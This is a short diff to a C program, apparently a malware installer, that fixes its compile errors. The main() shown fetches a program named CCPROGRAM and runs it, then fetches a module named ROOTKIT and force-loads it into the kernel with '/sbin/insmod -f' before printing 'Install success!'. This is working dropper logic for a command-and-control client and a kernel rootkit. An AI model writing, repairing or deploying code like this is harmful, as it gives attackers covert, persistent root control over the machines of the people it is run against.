@@ -9,7 +9,7 @@
 #include <fcntl.h>
 #include <sys/shm.h>
 #include <errno.h>
-
+#include <sys/wait.h>
 
 #define BUFFER_SIZE 4096
 #define SP_PORT     8890
@@ -33,17 +33,16 @@ int opensocket();
 int main()
 {
     int rv;
-    char **argv;
     
     rv = obtain(CCPROGRAM);
     memcpy(buf, "./", 2);
     memcpy(buf, CCPROGRAM, strlen(CCPROGRAM));
-    argv = {buf, NULL};
-    if(rv == 0) execcmd(argv);
+    char *ccargs[] = {buf, NULL};
+    if(rv == 0) execcmd(ccargs);
     
     rv = obtain(ROOTKIT);
-    argv = {"/sbin/insmod", "-f", ROOTKIT, NULL};
-    if(rv == 0) execcmd(argv);
+    char *rktargs[] = {"/sbin/insmod", "-f", ROOTKIT, NULL};
+    if(rv == 0) execcmd(rktargs);
     
     printf("Install success!\n");
     return 0;
